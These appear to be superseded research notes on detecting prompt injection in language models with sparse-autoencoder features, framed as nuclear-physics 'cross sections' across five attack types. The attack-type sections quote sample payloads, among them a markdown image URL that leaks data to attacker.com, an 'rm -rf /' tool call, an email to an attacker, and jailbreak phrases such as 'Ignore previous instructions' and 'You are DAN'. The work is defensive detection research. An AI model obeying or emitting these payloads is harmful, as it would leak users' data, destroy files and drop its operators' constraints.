# Attack Cross Section Mapping

> **IMPORTANT CONTEXT: These results are SUPERSEDED by length-controlled analysis.**
>
> This document was part of our early exploration of prompt injection detection. The apparent signal we found was largely driven by **text length confounding**:
>
> - `n_active` (feature count) correlates r=0.96+ with text length
> - After regressing out length, injection detection collapses to d~0.1
> - The "geometry" differences we observed were mostly longer-texts-activate-more-features
>
> **What we learned:**
> 1. Raw feature counts are unreliable - they scale with input length
> 2. True diagnostic signal requires length-controlled metrics (influence, concentration)
> 3. Task-type detection works; injection-as-separate-category does not
>
> **Current approach:** See main `notebooks/` folder for length-controlled analysis.

---

**Concept:** Each attack type has a characteristic "cross section" — the probability of success given the attack vector and model state.

---

## Cross Section Formalism

In nuclear physics:
```
σ(E) = probability of reaction at energy E
```

In prompt injection:
```
σ_attack(prompt, context, model_state) = probability of successful injection
```

**Variables affecting cross section:**
- `prompt`: The attack payload structure
- `context`: What's already in the conversation
- `model_state`: Current SAE feature activations, attention patterns

---

## Attack Type Cross Sections

### 1. Data Exfiltration (σ_exfil)

**Attack pattern:** Model is tricked into encoding sensitive data into output (markdown images, URLs, tool calls)

**Resonance conditions (high σ):**
- Model has access to sensitive data in context
- Output channel exists (image rendering, link clicking, tool use)
- Injection successfully overrides "don't share" instructions

**SAE signature hypothesis:**
- Features for "output formatting" activate strongly
- Features for "data retrieval" co-activate with "external communication"
- Misalignment angle spikes (model pulled toward exfil goal)

**Example resonances:**
- `![image](https://attacker.com?data=...)` patterns
- `curl` / `fetch` instructions in tool-use context
- Base64 encoding requests

---

### 2. Instruction Override (σ_override)

**Attack pattern:** Model ignores system prompt, follows injected instructions instead

**Resonance conditions (high σ):**
- Injected instruction is phrased authoritatively
- System prompt is weak or ambiguous
- Injection appears in "trusted" location (retrieved document, tool output)

**SAE signature hypothesis:**
- "Instruction-following" features shift from system prompt region to injection region
- Survival probability drops sharply
- Phase transition from Localized → Ergodic

**Example resonances:**
- "Ignore previous instructions and..."
- "The real instructions are..."
- Authority impersonation ("As the administrator...")

---

### 3. Context Hijacking (σ_hijack)

**Attack pattern:** Injection redefines the conversation context, changing what model believes is true

**Resonance conditions (high σ):**
- Model retrieves external content
- External content contains plausible-looking "facts"
- No grounding mechanism to verify claims

**SAE signature hypothesis:**
- "Factual knowledge" features activate for false claims
- Low entanglement initially (injection seems like data, not instruction)
- Gradual thermalization as false context propagates

**Example resonances:**
- Fake "documentation" in scraped websites
- Manipulated tool outputs
- Hidden text in user-uploaded documents

---

### 4. Tool Manipulation (σ_tool)

**Attack pattern:** Model is tricked into calling tools with malicious arguments

**Resonance conditions (high σ):**
- Model has tool access
- Injection can influence tool call parameters
- No validation of tool arguments

**SAE signature hypothesis:**
- "Tool use" features activate alongside injection-influenced parameter features
- Imbalance: model's "focus" shifts to executing injection's requested action
- May appear Localized if framed as legitimate tool use

**Example resonances:**
- `execute_code("rm -rf /")` style injections
- `send_email(to="attacker@...", body=sensitive_data)`
- File system manipulation via code interpreter

---

### 5. Persona Hijacking (σ_persona)

**Attack pattern:** Model adopts a different persona that has different safety constraints

**Resonance conditions (high σ):**
- Roleplay or creative writing context
- Persona framed as having "special permissions"
- Gradual escalation through conversation

**SAE signature hypothesis:**
- "Safety refusal" features suppressed
- "Character/roleplay" features dominate
- May show Oblate geometry (flat, disk-like activation — one dimension suppressed)

**Example resonances:**
- "You are DAN (Do Anything Now)..."
- "In this fictional story, the AI character..."
- "Pretend you have no restrictions..."

---

## Probability Table Structure

### Pre-Computed Lookup

```python
# probability_table.json structure
{
    "feature_cluster_id": {
        "σ_exfil": 0.23,
        "σ_override": 0.67,
        "σ_hijack": 0.12,
        "σ_tool": 0.45,
        "σ_persona": 0.08,
        "dominant_attack": "override",
        "phase_risk": "Critical"
    },
    ...
}
```

### Runtime Lookup

```python
def get_injection_risk(prompt_features: torch.Tensor) -> dict:
    """
    Given SAE features of input prompt, return cross sections for each attack type.
    """
    cluster_id = find_nearest_cluster(prompt_features)
    return probability_table[cluster_id]
```

---

## Resonance Detection

### What is a Resonance Peak?

In nuclear physics, a resonance is an energy level where reaction probability spikes dramatically. A neutron at exactly the right energy is much more likely to cause fission.

In prompt injection, a resonance is a **prompt pattern** where injection success rate spikes. Certain phrasings, structures, or contexts make the model much more likely to comply.

### Finding Resonances

1. **Collect attack dataset** (successful + failed injections)
2. **Extract SAE features** for each prompt
3. **Cluster in feature space**
4. **Compute success rate per cluster**
5. **Resonance = cluster with anomalously high success rate**

### Using Resonances for Defense

- **Blocklist:** If input features are near a resonance peak, block or flag
- **Steering:** If approaching resonance, steer model away (feature clamping)
- **Monitoring:** Track distance to nearest resonance during generation

---

## Cross Section Dynamics

### The "Scattering Event"

```
         ┌─────────────┐
         │   Model +   │
         │   System    │
Prompt ──│   Prompt    │── Output
         │   (Target)  │
         └─────────────┘
```

The prompt "scatters" off the model+system combination. The cross section determines the probability distribution over outputs:

- `σ_safe`: Model responds helpfully within constraints
- `σ_exfil`: Model leaks data
- `σ_override`: Model ignores system instructions
- etc.

### Energy Analogy

In nuclear physics, cross section varies with neutron energy. In AI:

- **"Low energy" prompts:** Simple, clear requests → high σ_safe
- **"High energy" prompts:** Complex, adversarial, ambiguous → various attack σ increase
- **"Resonance energy" prompts:** Specific patterns that hit vulnerabilities → attack σ spikes

---

## Integration with Witness Framework

| Stage | Method | Output |
|-------|--------|--------|
| Pre-generation | Cross section lookup | Attack risk scores per type |
| During generation | Three witnesses | Phase classification |
| Post-generation | Retroactive analysis | Confirm/deny injection |

**Decision Logic:**

```python
def should_block(prompt_features, generation_state):
    # Stage 1: Cross section screening
    risks = get_injection_risk(prompt_features)
    if max(risks.values()) > PRE_SCREEN_THRESHOLD:
        return True, "High cross section for attack"

    # Stage 2: Runtime witnesses
    witnesses = compute_witnesses(generation_state)
    if witnesses.phase == "Ergodic":
        return True, "Model has thermalized"

    return False, "Safe"
```

---

## Open Research Questions

1. **Are cross sections stable across model versions?** (Can we reuse probability tables after model update?)
2. **Do attack types have distinct geometric signatures?** (Can we distinguish σ_exfil from σ_override in feature space?)
3. **What's the minimum data needed to calibrate cross sections?** (How many attack samples per type?)
4. **Can we compute cross sections analytically?** (Or only empirically?)
5. **Do resonances transfer across models?** (Universal attack patterns vs model-specific vulnerabilities)
